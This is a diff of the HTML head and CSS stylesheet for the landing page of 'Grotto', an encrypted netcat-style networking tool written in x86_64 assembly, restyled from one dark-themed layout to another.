@@ -1,1304 +1,973 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Grotto — ChaCha20-Poly1305 Encrypted Netcat</title>
-  <meta name="description" content="x86_64 NASM assembly encrypted netcat for Linux and Windows with ChaCha20-Poly1305 AEAD. ~8 KB PE, ~13 KB ELF. PEB walking. Raw syscalls. Zero dependencies.">
-  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Ctext y='26' font-size='26'%3E%F0%9F%AA%A8%3C/text%3E%3C/svg%3E">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;0,600;0,700;1,400&display=swap" rel="stylesheet">
-  <style>
-    /* =========================================================
-       GROTTO LANDING PAGE
-       Catppuccin Mocha palette — dark terminal aesthetic
-       ========================================================= */
-
-    *, *::before, *::after {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    :root {
-      --ctp-rosewater: #f5e0dc;
-      --ctp-flamingo: #f2cdcd;
-      --ctp-pink: #f5c2e7;
-      --ctp-mauve: #cba6f7;
-      --ctp-red: #f38ba8;
-      --ctp-maroon: #eba0ac;
-      --ctp-peach: #fab387;
-      --ctp-yellow: #f9e2af;
-      --ctp-green: #a6e3a1;
-      --ctp-teal: #94e2d5;
-      --ctp-sky: #89dceb;
-      --ctp-sapphire: #74c7ec;
-      --ctp-blue: #89b4fa;
-      --ctp-lavender: #b4befe;
-      --ctp-text: #cdd6f4;
-      --ctp-subtext1: #bac2de;
-      --ctp-subtext0: #a6adc8;
-      --ctp-overlay2: #9399b2;
-      --ctp-overlay1: #7f849c;
-      --ctp-overlay0: #6c7086;
-      --ctp-surface2: #585b70;
-      --ctp-surface1: #45475a;
-      --ctp-surface0: #313244;
-      --ctp-base: #1e1e2e;
-      --ctp-mantle: #181825;
-      --ctp-crust: #11111b;
-    }
-
-    html {
-      scroll-behavior: smooth;
-      scrollbar-width: thin;
-      scrollbar-color: var(--ctp-surface1) var(--ctp-crust);
-    }
-
-    body {
-      font-family: 'JetBrains Mono', monospace;
-      background-color: var(--ctp-crust);
-      color: var(--ctp-text);
-      line-height: 1.7;
-      font-size: 15px;
-      overflow-x: hidden;
-      position: relative;
-    }
-
-    /* ---- Dot-grid background pattern ---- */
-    body::before {
-      content: '';
-      position: fixed;
-      inset: 0;
-      background-image: radial-gradient(var(--ctp-surface0) 1px, transparent 1px);
-      background-size: 24px 24px;
-      opacity: 0.3;
-      pointer-events: none;
-      z-index: 0;
-    }
-
-    /* ---- CRT scanline overlay ---- */
-    body::after {
-      content: '';
-      position: fixed;
-      inset: 0;
-      background: repeating-linear-gradient(
-        0deg,
-        transparent,
-        transparent 2px,
-        rgba(0, 0, 0, 0.03) 2px,
-        rgba(0, 0, 0, 0.03) 4px
-      );
-      pointer-events: none;
-      z-index: 9999;
-    }
-
-    /* ---- Layout ---- */
-    .page-wrap {
-      position: relative;
-      z-index: 1;
-      max-width: 1100px;
-      margin: 0 auto;
-      padding: 0 24px;
-    }
-
-    section {
-      margin-bottom: 96px;
-    }
-
-    a {
-      color: var(--ctp-sapphire);
-      text-decoration: none;
-      transition: color 0.2s;
-    }
-
-    a:hover {
-      color: var(--ctp-sky);
-    }
-
-    /* ---- Section titles ---- */
-    .section-label {
-      display: inline-block;
-      font-size: 11px;
-      font-weight: 600;
-      letter-spacing: 0.15em;
-      text-transform: uppercase;
-      color: var(--ctp-overlay0);
-      border: 1px solid var(--ctp-surface1);
-      padding: 4px 12px;
-      border-radius: 2px;
-      margin-bottom: 20px;
-    }
-
-    .section-title {
-      font-size: clamp(22px, 3vw, 30px);
-      font-weight: 700;
-      color: var(--ctp-text);
-      margin-bottom: 12px;
-      line-height: 1.3;
-    }
-
-    .section-desc {
-      color: var(--ctp-subtext0);
-      font-size: 14px;
-      max-width: 600px;
-      margin-bottom: 40px;
-    }
-
-    /* =========================================================
-       HERO
-       ========================================================= */
-    .hero {
-      padding: 80px 0 48px;
-      text-align: center;
-      margin-bottom: 64px;
-    }
-
-    .hero-terminal {
-      border: 1px solid var(--ctp-surface1);
-      border-radius: 8px;
-      background: var(--ctp-mantle);
-      max-width: 780px;
-      margin: 0 auto;
-      overflow: hidden;
-      box-shadow:
-        0 0 0 1px var(--ctp-surface0),
-        0 24px 80px -12px rgba(0, 0, 0, 0.6),
-        0 0 120px -40px rgba(148, 226, 213, 0.08);
-    }
-
-    .hero-titlebar {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      padding: 12px 16px;
-      background: var(--ctp-crust);
-      border-bottom: 1px solid var(--ctp-surface0);
-    }
-
-    .hero-dot {
-      width: 12px;
-      height: 12px;
-      border-radius: 50%;
-    }
-
-    .hero-dot--red    { background: var(--ctp-red); }
-    .hero-dot--yellow { background: var(--ctp-yellow); }
-    .hero-dot--green  { background: var(--ctp-green); }
-
-    .hero-titlebar-text {
-      flex: 1;
-      text-align: center;
-      font-size: 12px;
-      color: var(--ctp-overlay0);
-      letter-spacing: 0.05em;
-    }
-
-    .hero-body {
-      padding: 48px 40px 56px;
-    }
-
-    .hero-title {
-      font-size: clamp(42px, 7vw, 72px);
-      font-weight: 700;
-      letter-spacing: -0.03em;
-      line-height: 1.05;
-      margin-bottom: 8px;
-      background: linear-gradient(
-        135deg,
-        var(--ctp-teal) 0%,
-        var(--ctp-sapphire) 35%,
-        var(--ctp-blue) 65%,
-        var(--ctp-mauve) 100%
-      );
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-      filter: drop-shadow(0 0 40px rgba(148, 226, 213, 0.2));
-    }
-
-    .hero-cursor {
-      display: inline-block;
-      width: 3px;
-      height: 0.8em;
-      background: var(--ctp-teal);
-      margin-left: 4px;
-      vertical-align: baseline;
-      animation: blink 1s step-end infinite;
-    }
-
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50%       { opacity: 0; }
-    }
-
-    .hero-tagline {
-      font-size: clamp(14px, 2vw, 17px);
-      color: var(--ctp-subtext0);
-      margin-bottom: 36px;
-      font-weight: 400;
-      line-height: 1.6;
-    }
-
-    .hero-tagline em {
-      color: var(--ctp-subtext1);
-      font-style: normal;
-    }
-
-    .hero-stats {
-      display: flex;
-      justify-content: center;
-      gap: 32px;
-      margin-bottom: 36px;
-      flex-wrap: wrap;
-    }
-
-    .hero-stat {
-      text-align: center;
-    }
-
-    .hero-stat-value {
-      font-size: 28px;
-      font-weight: 700;
-      line-height: 1.2;
-    }
-
-    .hero-stat:nth-child(1) .hero-stat-value { color: var(--ctp-teal); }
-    .hero-stat:nth-child(2) .hero-stat-value { color: var(--ctp-blue); }
-    .hero-stat:nth-child(3) .hero-stat-value { color: var(--ctp-mauve); }
-    .hero-stat:nth-child(4) .hero-stat-value { color: var(--ctp-red); }
-
-    .hero-stat-label {
-      font-size: 11px;
-      color: var(--ctp-overlay1);
-      text-transform: uppercase;
-      letter-spacing: 0.1em;
-    }
-
-    .hero-buttons {
-      display: flex;
-      gap: 16px;
-      justify-content: center;
-      flex-wrap: wrap;
-    }
-
-    .btn {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      padding: 12px 28px;
-      border-radius: 4px;
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 14px;
-      font-weight: 500;
-      letter-spacing: 0.02em;
-      border: 1px solid transparent;
-      cursor: pointer;
-      transition: all 0.2s;
-      text-decoration: none;
-    }
-
-    .btn-primary {
-      background: var(--ctp-teal);
-      color: var(--ctp-crust);
-      border-color: var(--ctp-teal);
-    }
-
-    .btn-primary:hover {
-      background: var(--ctp-sky);
-      border-color: var(--ctp-sky);
-      color: var(--ctp-crust);
-      box-shadow: 0 0 24px rgba(148, 226, 213, 0.25);
-    }
-
-    .btn-ghost {
-      background: transparent;
-      color: var(--ctp-subtext1);
-      border-color: var(--ctp-surface1);
-    }
-
-    .btn-ghost:hover {
-      color: var(--ctp-text);
-      border-color: var(--ctp-overlay0);
-      background: var(--ctp-surface0);
-    }
-
-    /* =========================================================
-       FEATURES GRID
-       ========================================================= */
-    .features-grid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 16px;
-    }
-
-    .feature-card {
-      background: var(--ctp-mantle);
-      border: 1px solid var(--ctp-surface0);
-      border-radius: 6px;
-      padding: 28px 24px;
-      transition: all 0.25s;
-      position: relative;
-      overflow: hidden;
-    }
-
-    .feature-card::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      height: 2px;
-      background: linear-gradient(90deg, transparent, var(--ctp-teal), transparent);
-      opacity: 0;
-      transition: opacity 0.3s;
-    }
-
-    .feature-card:hover {
-      border-color: var(--ctp-surface1);
-      background: var(--ctp-base);
-      transform: translateY(-2px);
-      box-shadow: 0 8px 32px -8px rgba(0, 0, 0, 0.4);
-    }
-
-    .feature-card:hover::before {
-      opacity: 1;
-    }
-
-    .feature-icon {
-      font-size: 24px;
-      margin-bottom: 16px;
-      display: block;
-      width: 44px;
-      height: 44px;
-      line-height: 44px;
-      text-align: center;
-      background: var(--ctp-surface0);
-      border-radius: 8px;
-      border: 1px solid var(--ctp-surface1);
-    }
-
-    .feature-card h3 {
-      font-size: 14px;
-      font-weight: 600;
-      color: var(--ctp-text);
-      margin-bottom: 8px;
-    }
-
-    .feature-card p {
-      font-size: 13px;
-      color: var(--ctp-subtext0);
-      line-height: 1.6;
-    }
-
-    .feature-card:nth-child(1):hover { border-color: var(--ctp-teal); }
-    .feature-card:nth-child(1):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-teal), transparent); }
-
-    .feature-card:nth-child(2):hover { border-color: var(--ctp-sapphire); }
-    .feature-card:nth-child(2):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-sapphire), transparent); }
-
-    .feature-card:nth-child(3):hover { border-color: var(--ctp-blue); }
-    .feature-card:nth-child(3):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-blue), transparent); }
-
-    .feature-card:nth-child(4):hover { border-color: var(--ctp-mauve); }
-    .feature-card:nth-child(4):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-mauve), transparent); }
-
-    .feature-card:nth-child(5):hover { border-color: var(--ctp-green); }
-    .feature-card:nth-child(5):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-green), transparent); }
-
-    .feature-card:nth-child(6):hover { border-color: var(--ctp-peach); }
-    .feature-card:nth-child(6):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-peach), transparent); }
-
-    /* =========================================================
-       ARCHITECTURE
-       ========================================================= */
-    .arch-terminal {
-      border: 1px solid var(--ctp-surface1);
-      border-radius: 8px;
-      overflow: hidden;
-      background: var(--ctp-mantle);
-      box-shadow: 0 16px 48px -12px rgba(0, 0, 0, 0.4);
-    }
-
-    .arch-titlebar {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      padding: 10px 16px;
-      background: var(--ctp-crust);
-      border-bottom: 1px solid var(--ctp-surface0);
-    }
-
-    .arch-titlebar-text {
-      flex: 1;
-      text-align: center;
-      font-size: 12px;
-      color: var(--ctp-overlay0);
-    }
-
-    .arch-body {
-      padding: 32px;
-    }
-
-    .arch-divider {
-      border: none;
-      border-top: 1px dashed var(--ctp-surface1);
-      margin: 28px 0;
-    }
-
-    /* ---- Data flow diagram ---- */
-    .flow-diagram {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0;
-      margin-bottom: 0;
-      flex-wrap: nowrap;
-    }
-
-    .flow-node {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .flow-node-box {
-      padding: 14px 24px;
-      border: 1px solid var(--ctp-surface1);
-      border-radius: 6px;
-      background: var(--ctp-base);
-      font-size: 14px;
-      font-weight: 600;
-      color: var(--ctp-teal);
-      white-space: nowrap;
-    }
-
-    .flow-node-label {
-      font-size: 11px;
-      color: var(--ctp-overlay1);
-      text-transform: uppercase;
-      letter-spacing: 0.08em;
-    }
-
-    .flow-arrows {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 6px;
-      padding: 0 16px;
-      flex-shrink: 0;
-    }
-
-    .flow-arrow {
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      font-size: 11px;
-      color: var(--ctp-overlay1);
-      white-space: nowrap;
-    }
-
-    .flow-arrow-line {
-      width: 60px;
-      height: 1px;
-      background: var(--ctp-surface2);
-      position: relative;
-    }
-
-    .flow-arrow-line::after {
-      content: '';
-      position: absolute;
-      right: -1px;
-      top: -3px;
-      border: 3px solid transparent;
-      border-left: 5px solid var(--ctp-surface2);
-    }
-
-    .flow-arrow--left .flow-arrow-line::after {
-      right: auto;
-      left: -1px;
-      border-left: none;
-      border-right: 5px solid var(--ctp-surface2);
-    }
-
-    .flow-arrow-tag {
-      padding: 2px 8px;
-      border-radius: 3px;
-      background: var(--ctp-surface0);
-      font-size: 10px;
-      letter-spacing: 0.04em;
-    }
-
-    .flow-arrow-tag--tcp { color: var(--ctp-green); }
-    .flow-arrow-tag--enc { color: var(--ctp-mauve); }
-
-    /* ---- Wire format bar ---- */
-    .wire-bar-label {
-      font-size: 12px;
-      color: var(--ctp-overlay1);
-      font-weight: 500;
-      margin-bottom: 12px;
-      letter-spacing: 0.04em;
-    }
-
-    .wire-bar {
-      display: flex;
-      border-radius: 6px;
-      overflow: hidden;
-      border: 1px solid var(--ctp-surface1);
-      margin-bottom: 8px;
-    }
-
-    .wire-segment {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 14px 0;
-      gap: 4px;
-      border-right: 1px solid var(--ctp-surface1);
-    }
-
-    .wire-segment:last-child {
-      border-right: none;
-    }
-
-    .wire-segment-name {
-      font-size: 12px;
-      font-weight: 600;
-    }
-
-    .wire-segment-detail {
-      font-size: 10px;
-      opacity: 0.7;
-    }
-
-    .wire-seg--len {
-      flex: 1;
-      background: rgba(148, 226, 213, 0.08);
-      color: var(--ctp-teal);
-    }
-
-    .wire-seg--nonce {
-      flex: 1.5;
-      background: rgba(137, 180, 250, 0.08);
-      color: var(--ctp-blue);
-    }
-
-    .wire-seg--ct {
-      flex: 3;
-      background: rgba(249, 226, 175, 0.08);
-      color: var(--ctp-yellow);
-    }
-
-    .wire-seg--mac {
-      flex: 1.5;
-      background: rgba(203, 166, 247, 0.08);
-      color: var(--ctp-mauve);
-    }
-
-    /* =========================================================
-       CROSS-PLATFORM SECTION
-       ========================================================= */
-    .platform-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 16px;
-      max-width: 1000px;
-      margin: 0 auto;
-    }
-
-    .platform-card {
-      border: 1px solid var(--ctp-surface1);
-      border-radius: 8px;
-      overflow: hidden;
-      background: var(--ctp-mantle);
-      box-shadow: 0 8px 32px -8px rgba(0, 0, 0, 0.3);
-    }
-
-    .platform-titlebar {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      padding: 10px 16px;
-      background: var(--ctp-crust);
-      border-bottom: 1px solid var(--ctp-surface0);
-    }
-
-    .platform-titlebar-text {
-      flex: 1;
-      text-align: center;
-      font-size: 12px;
-      color: var(--ctp-overlay0);
-    }
-
-    .platform-body {
-      padding: 24px;
-    }
-
-    .platform-body h3 {
-      font-size: 16px;
-      font-weight: 600;
-      color: var(--ctp-text);
-      margin-bottom: 16px;
-    }
-
-    .platform-item {
-      display: flex;
-      align-items: flex-start;
-      gap: 10px;
-      padding: 8px 0;
-      font-size: 13px;
-      color: var(--ctp-subtext0);
-      line-height: 1.5;
-    }
-
-    .platform-item .p-dot {
-      width: 6px;
-      height: 6px;
-      border-radius: 50%;
-      flex-shrink: 0;
-      margin-top: 7px;
-    }
-
-    .p-dot--linux { background: var(--ctp-green); }
-    .p-dot--win   { background: var(--ctp-blue); }
-
-    /* =========================================================
-       INTERNALS / CAPABILITIES
-       ========================================================= */
-    .capabilities-section {
-      text-align: center;
-    }
-
-    .capabilities-terminal {
-      border: 1px solid var(--ctp-surface1);
-      border-radius: 8px;
-      overflow: hidden;
-      background: var(--ctp-mantle);
-      box-shadow:
-        0 0 0 1px var(--ctp-surface0),
-        0 32px 80px -16px rgba(0, 0, 0, 0.5),
-        0 0 160px -60px rgba(148, 226, 213, 0.06);
-      max-width: 1000px;
-      margin: 0 auto;
-    }
-
-    .capabilities-titlebar {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      padding: 10px 16px;
-      background: var(--ctp-crust);
-      border-bottom: 1px solid var(--ctp-surface0);
-    }
-
-    .capabilities-titlebar-text {
-      flex: 1;
-      text-align: center;
-      font-size: 12px;
-      color: var(--ctp-overlay0);
-    }
-
-    .capabilities-body {
-      padding: 32px;
-    }
-
-    .capabilities-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
-      gap: 10px;
-      margin-bottom: 24px;
-    }
-
-    .capability-pill {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      padding: 10px 14px;
-      border: 1px solid var(--ctp-surface0);
-      border-radius: 4px;
-      background: var(--ctp-base);
-      font-size: 13px;
-      color: var(--ctp-subtext1);
-      transition: all 0.2s;
-    }
-
-    .capability-pill:hover {
-      border-color: var(--ctp-surface2);
-      background: var(--ctp-surface0);
-    }
-
-    .capability-pill .dot {
-      width: 6px;
-      height: 6px;
-      border-radius: 50%;
-      flex-shrink: 0;
-    }
-
-    .dot--api     { background: var(--ctp-green); }
-    .dot--net     { background: var(--ctp-blue); }
-    .dot--chacha  { background: var(--ctp-teal); }
-    .dot--aead    { background: var(--ctp-mauve); }
-    .dot--exec    { background: var(--ctp-peach); }
-    .dot--relay   { background: var(--ctp-red); }
-
-    .capabilities-legend {
-      display: flex;
-      justify-content: center;
-      gap: 24px;
-      flex-wrap: wrap;
-      font-size: 12px;
-      color: var(--ctp-overlay1);
-    }
-
-    .capabilities-legend span {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    /* =========================================================
-       QUICK START
-       ========================================================= */
-    .start-terminal {
-      border: 1px solid var(--ctp-surface1);
-      border-radius: 8px;
-      overflow: hidden;
-      background: var(--ctp-mantle);
-      box-shadow: 0 16px 48px -12px rgba(0, 0, 0, 0.4);
-    }
-
-    .start-titlebar {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      padding: 10px 16px;
-      background: var(--ctp-crust);
-      border-bottom: 1px solid var(--ctp-surface0);
-    }
-
-    .start-titlebar-text {
-      flex: 1;
-      text-align: center;
-      font-size: 12px;
-      color: var(--ctp-overlay0);
-    }
-
-    .start-body {
-      padding: 28px 32px;
-    }
-
-    .start-line {
-      margin-bottom: 4px;
-      font-size: 14px;
-      line-height: 1.8;
-    }
-
-    .start-line .prompt {
-      color: var(--ctp-green);
-      user-select: none;
-    }
-
-    .start-line .cmd {
-      color: var(--ctp-text);
-    }
-
-    .start-line .comment {
-      color: var(--ctp-overlay0);
-    }
-
-    .start-line .flag {
-      color: var(--ctp-peach);
-    }
-
-    .start-line .arg {
-      color: var(--ctp-yellow);
-    }
-
-    .start-line .str {
-      color: var(--ctp-green);
-    }
-
-    .start-spacer {
-      height: 14px;
-    }
-
-    /* =========================================================
-       FOOTER
-       ========================================================= */
-    .site-footer {
-      border-top: 1px solid var(--ctp-surface0);
-      padding: 48px 0;
-      text-align: center;
-      margin-top: 32px;
-    }
-
-    .footer-tagline {
-      font-size: 16px;
-      font-weight: 600;
-      color: var(--ctp-subtext1);
-      margin-bottom: 8px;
-      letter-spacing: 0.02em;
-    }
-
-    .footer-sub {
-      font-size: 13px;
-      color: var(--ctp-overlay1);
-      margin-bottom: 28px;
-    }
-
-    .footer-links {
-      display: flex;
-      justify-content: center;
-      gap: 32px;
-      margin-bottom: 28px;
-      flex-wrap: wrap;
-    }
-
-    .footer-links a {
-      font-size: 13px;
-      color: var(--ctp-overlay1);
-      transition: color 0.2s;
-    }
-
-    .footer-links a:hover {
-      color: var(--ctp-teal);
-    }
-
-    .footer-copy {
-      font-size: 12px;
-      color: var(--ctp-overlay0);
-    }
-
-    /* =========================================================
-       RESPONSIVE
-       ========================================================= */
-    @media (max-width: 900px) {
-      .features-grid {
-        grid-template-columns: repeat(2, 1fr);
-      }
-      .hero-body {
-        padding: 36px 24px 44px;
-      }
-      .hero-stats {
-        gap: 24px;
-      }
-      .platform-grid {
-        grid-template-columns: 1fr;
-      }
-    }
-
-    @media (max-width: 600px) {
-      body {
-        font-size: 14px;
-      }
-      .page-wrap {
-        padding: 0 16px;
-      }
-      .features-grid {
-        grid-template-columns: 1fr;
-      }
-      .capabilities-grid {
-        grid-template-columns: repeat(2, 1fr);
-      }
-      section {
-        margin-bottom: 64px;
-      }
-      .hero {
-        padding: 48px 0 32px;
-      }
-      .hero-body {
-        padding: 28px 20px 36px;
-      }
-      .hero-buttons {
-        flex-direction: column;
-        align-items: center;
-      }
-      .btn {
-        width: 100%;
-        max-width: 260px;
-        justify-content: center;
-      }
-      .arch-body {
-        padding: 20px;
-      }
-      .flow-diagram {
-        gap: 0;
-      }
-      .flow-node-box {
-        padding: 10px 16px;
-        font-size: 12px;
-      }
-      .flow-arrows {
-        padding: 0 10px;
-      }
-      .flow-arrow-line {
-        width: 36px;
-      }
-      .wire-segment-name {
-        font-size: 11px;
-      }
-      .wire-segment-detail {
-        font-size: 9px;
-      }
-      .start-body {
-        padding: 20px;
-      }
-      .start-line {
-        font-size: 12px;
-      }
-      .feature-card {
-        padding: 22px 20px;
-      }
-    }
-
-    /* ---- Selection highlight ---- */
-    ::selection {
-      background: rgba(148, 226, 213, 0.25);
-      color: var(--ctp-text);
-    }
-
-    /* ---- Focus styles for accessibility ---- */
-    a:focus-visible,
-    .btn:focus-visible {
-      outline: 2px solid var(--ctp-teal);
-      outline-offset: 2px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Grotto — ChaCha20-Poly1305 Encrypted Networking in Assembly</title>
+    <meta name="description" content="ChaCha20-Poly1305 authenticated encryption networking tool in pure x86_64 NASM assembly. Cross-platform, zero dependencies, ~8 KB binary.">
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Ctext y='26' font-size='26'%3E%F0%9F%AA%A8%3C/text%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --red: #f38ba8;
+            --maroon: #eba0ac;
+            --pink: #f5c2e7;
+            --mauve: #cba6f7;
+            --lavender: #b4befe;
+            --blue: #89b4fa;
+            --sapphire: #74c7ec;
+            --sky: #89dceb;
+            --teal: #94e2d5;
+            --green: #a6e3a1;
+            --yellow: #f9e2af;
+            --peach: #fab387;
+            --text: #cdd6f4;
+            --subtext1: #bac2de;
+            --subtext0: #a6adc8;
+            --overlay2: #9399b2;
+            --overlay1: #7f849c;
+            --overlay0: #6c7086;
+            --surface2: #585b70;
+            --surface1: #45475a;
+            --surface0: #313244;
+            --base: #1e1e2e;
+            --mantle: #181825;
+            --crust: #11111b;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: var(--base);
+            color: var(--text);
+            line-height: 1.7;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background-image: radial-gradient(circle, var(--overlay0) 1px, transparent 1px);
+            background-size: 24px 24px;
+            opacity: 0.15;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: repeating-linear-gradient(0deg, rgba(0,0,0,0.1), rgba(0,0,0,0.1) 1px, transparent 1px, transparent 2px);
+            pointer-events: none;
+            z-index: 999;
+            opacity: 0.4;
+        }
+
+        ::selection { background: rgba(116, 199, 236, 0.3); color: var(--text); }
+
+        a { color: var(--sapphire); text-decoration: none; transition: color 0.2s; }
+        a:hover { color: var(--sky); }
+
+        a:focus-visible, .btn:focus-visible {
+            outline: 2px solid var(--sapphire);
+            outline-offset: 2px;
+        }
+
+        code {
+            font-family: 'JetBrains Mono', monospace;
+            background: var(--mantle);
+            padding: 2px 7px;
+            border-radius: 3px;
+            font-size: 0.88em;
+            color: var(--green);
+        }
+
+        .container { max-width: 1140px; margin: 0 auto; padding: 0 28px; }
+
+        /* ── Hero ── */
+        .hero {
+            padding: 100px 0 70px;
+            text-align: center;
+            position: relative;
+        }
+
+        .hero::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 10%;
+            right: 10%;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--surface1), transparent);
+        }
+
+        .hero-logo {
+            max-width: 440px;
+            margin: 0 auto 32px;
+        }
+
+        .hero-logo img { width: 100%; height: auto; }
+
+        .hero .subtitle {
+            font-size: clamp(15px, 2vw, 18px);
+            color: var(--subtext0);
+            max-width: 680px;
+            margin: 0 auto 28px;
+            line-height: 1.7;
+        }
+
+        .hero .warning {
+            background: rgba(243, 139, 168, 0.07);
+            border: 1px solid rgba(243, 139, 168, 0.3);
+            border-radius: 6px;
+            padding: 14px 24px;
+            margin: 28px auto;
+            max-width: 720px;
+            font-size: 13px;
+            line-height: 1.6;
+            color: var(--subtext1);
+        }
+
+        .hero .warning strong { color: var(--red); }
+
+        /* ── Stats ── */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 16px;
+            margin: 48px 0;
+        }
+
+        .stat {
+            background: var(--surface0);
+            border: 1px solid var(--surface1);
+            border-radius: 8px;
+            padding: 20px 16px;
+            text-align: center;
+            transition: transform 0.2s, border-color 0.2s;
+        }
+
+        .stat:hover { transform: translateY(-2px); border-color: var(--surface2); }
+
+        .stat-value {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 28px;
+            font-weight: 700;
+            line-height: 1;
+        }
+
+        .stat:nth-child(1) .stat-value { color: var(--teal); }
+        .stat:nth-child(2) .stat-value { color: var(--blue); }
+        .stat:nth-child(3) .stat-value { color: var(--mauve); }
+        .stat:nth-child(4) .stat-value { color: var(--red); }
+
+        .stat-label { font-size: 12px; color: var(--overlay1); margin-top: 6px; letter-spacing: 0.03em; }
+
+        /* ── CTAs ── */
+        .cta-group { display: flex; gap: 14px; justify-content: center; margin-top: 36px; }
+
+        .btn {
+            padding: 13px 32px;
+            border-radius: 6px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            font-weight: 600;
+            text-decoration: none;
+            letter-spacing: 0.03em;
+            transition: all 0.2s;
+            display: inline-block;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--sapphire), var(--blue));
+            color: var(--crust);
+        }
+
+        .btn-primary:hover {
+            box-shadow: 0 0 24px rgba(116, 199, 236, 0.35);
+            transform: translateY(-2px);
+        }
+
+        .btn-secondary {
+            background: var(--surface0);
+            color: var(--text);
+            border: 1px solid var(--surface1);
+        }
+
+        .btn-secondary:hover { background: var(--surface1); border-color: var(--surface2); }
+
+        .btn-ghost {
+            background: transparent;
+            color: var(--subtext1);
+            border: 1px solid var(--surface1);
+        }
+
+        .btn-ghost:hover { background: var(--surface0); color: var(--text); }
+
+        /* ── Sections ── */
+        section { padding: 72px 0; }
+
+        section h2 {
+            font-size: clamp(28px, 4vw, 42px);
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: var(--text);
+            letter-spacing: -0.02em;
+        }
+
+        .section-desc {
+            font-size: 15px;
+            color: var(--subtext0);
+            margin-bottom: 44px;
+            max-width: 640px;
+            line-height: 1.7;
+        }
+
+        /* ── Feature Grid ── */
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 20px;
+        }
+
+        .feature {
+            background: var(--surface0);
+            border: 1px solid var(--surface1);
+            border-radius: 8px;
+            padding: 28px;
+            transition: all 0.25s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .feature::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--sapphire), var(--lavender));
+            opacity: 0;
+            transition: opacity 0.25s;
+        }
+
+        .feature:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.25);
+            border-color: var(--surface2);
+        }
+
+        .feature:hover::before { opacity: 1; }
+
+        .feature h3 {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--sapphire);
+            margin-bottom: 10px;
+            letter-spacing: 0.02em;
+        }
+
+        .feature p { font-size: 13.5px; color: var(--subtext1); line-height: 1.65; }
+
+        /* ── Capabilities ── */
+        .capabilities {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 10px;
+        }
+
+        .capability {
+            background: var(--surface0);
+            border: 1px solid var(--surface1);
+            border-radius: 20px;
+            padding: 9px 18px;
+            font-size: 12.5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.2s;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .capability:hover { border-color: var(--surface2); background: var(--surface1); }
+
